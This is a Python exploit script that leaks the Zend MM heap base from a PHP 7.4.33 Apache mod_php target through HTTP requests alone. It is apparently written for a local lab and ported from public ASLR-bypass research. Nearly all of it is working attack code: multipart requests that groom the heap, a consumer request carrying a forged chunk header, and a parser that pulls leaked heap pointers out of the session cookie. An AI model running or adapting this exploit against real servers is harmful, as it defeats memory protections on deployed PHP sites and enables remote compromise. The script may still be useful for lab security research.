"""HTTP-only Zend MM heap-base leak for the pinned PHP 7.4.33 lab.

No Docker API, /proc, debugger, target-side file, or error output is used.
The A/B layout is a PHP-7.4.33 port of 9bie's public Off-mode research:
https://github.com/9bie/php2shell-bypass-aslr-exp
"""
import argparse
import json
import re
import socket
import threading
import urllib.parse
from collections import Counter
from pathlib import Path

BASE = Path(__file__).resolve().parent

def multipart(parts, boundary):
    out = bytearray()
    for name, filename, data in parts:
        out += b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\""
        if filename is not None:
            out += b"; filename=\"" + filename + b"\"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + data + b"\r\n"
    return bytes(out + b"--" + boundary + b"--\r\n")

def post(host, port, body, boundary, cap=2_000_000, extra_headers=b"", timeout=30):
    request = (f"POST /index.php HTTP/1.1\r\nHost: {host}:{port}\r\n"
               f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n").encode()
    request += extra_headers + b"\r\n"
    sock = socket.create_connection((host, port), timeout=20)
    sock.settimeout(timeout)
    response = bytearray()
    def reader():
        try:
            while len(response) < cap:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response.extend(chunk)
        except OSError:
            pass
    thread = threading.Thread(target=reader, daemon=True)
    thread.start()
    try:
        sock.sendall(request)
        view = memoryview(body)
        for offset in range(0, len(body), 262144):
            sock.sendall(view[offset:offset + 262144])
    except OSError:
        pass
    thread.join(timeout + 1)
    sock.close()
    return bytes(response)

def warmup(host, port):
    with socket.create_connection((host, port), timeout=3) as sock:
        sock.sendall((f"GET /index.php HTTP/1.1\r\nHost: {host}:{port}\r\n"
                      "Connection: close\r\n\r\n").encode())
        while sock.recv(4096):
            pass

def producer(large_count=232, small_count=213, small_length=231,
             name_count=62, expanded_large=15, guard_count=2,
             slot_guard=True, small_head_length=400, ht_spray_count=0,
             expanded_length=16400, budget_pad_length=0,
             first_large_length=0):
    parts = []
    for i in range(name_count):
        name = (f"g{i:04d}" + "x" * 103)[:103].encode()
        parts.append((name, None, b"v" * 8))
    for i in range(large_count):
        length = (first_large_length if i == 0 and first_large_length
                  else expanded_length if i < expanded_large else 15000)
        parts.append((str(1000 + i).encode(), None, b"B" * length))
    for i in range(ht_spray_count):
        parts.append((f"ht{i:04d}".encode(), None, b"H" * 39))
    for i in range(small_count):
        length = small_head_length if i == 0 else small_length
        parts.append((str(100000 + i).encode(), None, b"X" * length))
    if budget_pad_length:
        parts.append((b"budgetpad", None, b"D" * budget_pad_length))
    for i in range(guard_count):
        parts.append((f"pg{i}".encode(), None, b"G" * 23))
    if slot_guard:
        parts.append((b"slot", None, b"R" * 103))
    parts.append((b"PHPSESSID", None, b"\x00"))
    parts.append((b"P", None, b"pwn"))
    parts.append((b"F" * 103, b"A" * 100, b"A" * 64))
    boundary = b"S" * 17
    return multipart(parts, boundary), boundary

def consumer(field_count=160, guard_count=0):
    parts = [(f"guard{i}".encode(), None, b"\x00" * 31)
             for i in range(guard_count)]
    parts += [(str(1000 + i).encode(), None, b"V" * 231) for i in range(field_count)]
    parts.append((b"900001", None, b"P" * 1048551))
    distance = (510 - 256) * 4096
    forged = bytearray(b"Q" * (distance + 1000))
    forged[distance - 24:distance - 16] = (0x4141414141414141).to_bytes(8, "little")
    forged[distance - 16:distance - 8] = (0).to_bytes(8, "little")
    forged[distance - 8:distance] = (4000).to_bytes(8, "little")
    forged[distance:] = b"M" * (len(forged) - distance)
    parts.append((b"900002", None, bytes(forged)))
    parts.append((b"PHPSESSID", None, b"attacksessionid0001"))
    parts.append((b"P", None, b"pwn"))
    boundary = b"B" * 10
    return multipart(parts, boundary), boundary

def cookie_bytes(response):
    match = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", response)
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1")) if match else b""

def heap_base(raw):
    candidates = Counter()
    for offset in range(max(0, len(raw) - 7)):
        value = int.from_bytes(raw[offset:offset + 8], "little")
        # Docker Desktop's Linux VM may place mappings below the commonly
        # assumed 0x7f... range; accept canonical high user mappings.
        if 0x700000000000 <= value < 0x800000000000:
            candidates[value & ~0x1FFFFF] += 1
    if not candidates:
        return 0, 0
    base, count = candidates.most_common(1)[0]
    return (base, count) if count >= 8 else (0, count)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=17433)
    parser.add_argument("--large-count", type=int, default=232,
                        help=argparse.SUPPRESS)
    parser.add_argument("--small-count", type=int, default=213,
                        help=argparse.SUPPRESS)
    parser.add_argument("--small-length", type=int, default=231,
                        help=argparse.SUPPRESS)
    parser.add_argument("--name-count", type=int, default=62,
                        help=argparse.SUPPRESS)
    parser.add_argument("--expanded-large", type=int, default=15,
                        help=argparse.SUPPRESS)
    parser.add_argument("--producer-guards", type=int, default=2,
                        help=argparse.SUPPRESS)
    parser.add_argument("--no-slot-guard", action="store_true",
                        help=argparse.SUPPRESS)
    parser.add_argument("--small-head-length", type=int, default=400,
                        help=argparse.SUPPRESS)
    parser.add_argument("--ht-spray", type=int, default=0,
                        help=argparse.SUPPRESS)
    parser.add_argument("--expanded-length", type=int, default=16400,
                        help=argparse.SUPPRESS)
    parser.add_argument("--budget-pad-length", type=int, default=0,
                        help=argparse.SUPPRESS)
    parser.add_argument("--first-large-length", type=int, default=0,
                        help=argparse.SUPPRESS)
    parser.add_argument("--producer-only", action="store_true",
                        help=argparse.SUPPRESS)
    parser.add_argument("--consumer-count", type=int, default=160,
                        help=argparse.SUPPRESS)
    parser.add_argument("--guard-count", type=int, default=0,
                        help=argparse.SUPPRESS)
    parser.add_argument("--consumer-cookie-len", type=int, default=0,
                        help=argparse.SUPPRESS)
    args = parser.parse_args()
    warmup(args.host, args.port)
    a_body, a_boundary = producer(args.large_count, args.small_count,
                                  args.small_length, args.name_count,
                                  args.expanded_large, args.producer_guards,
                                  not args.no_slot_guard,
                                  args.small_head_length, args.ht_spray,
                                  args.expanded_length, args.budget_pad_length,
                                  args.first_large_length)
    a_response = post(args.host, args.port, a_body, a_boundary)
    if args.producer_only:
        print(a_response.split(b"\r\n", 1)[0].decode("latin1", "replace"))
        return
    b_body, b_boundary = consumer(args.consumer_count, args.guard_count)
    cookie = (b"Cookie: X=" + b"C" * args.consumer_cookie_len + b"\r\n"
              if args.consumer_cookie_len else b"")
    b_response = post(args.host, args.port, b_body, b_boundary,
                      extra_headers=cookie)
    leaked = cookie_bytes(b_response)
    base, pointers = heap_base(leaked)
    result = {
        "php_version": "7.4.33", "sapi": "Apache mod_php",
        "display_errors": "Off", "transport": "HTTP only",
        "producer_status": a_response.split(b"\r\n", 1)[0].decode("latin1", "replace"),
        "consumer_status": b_response.split(b"\r\n", 1)[0].decode("latin1", "replace"),
        "decoded_cookie_bytes": len(leaked), "heap_pointer_candidates": pointers,
        "zend_mm_chunk_base": hex(base) if base else None,
    }
    evidence = BASE / "evidence"
    evidence.mkdir(exist_ok=True)
    (evidence / "remote-heap-leak.json").write_text(json.dumps(result, indent=2), encoding="utf-8")
    print(json.dumps(result, indent=2))
    if not base:
        raise SystemExit("[-] HTTP heap leak not reproduced")
    print(f"[+] HTTP-only heap leak confirmed: {base:#x}")

if __name__ == "__main__":
    main()
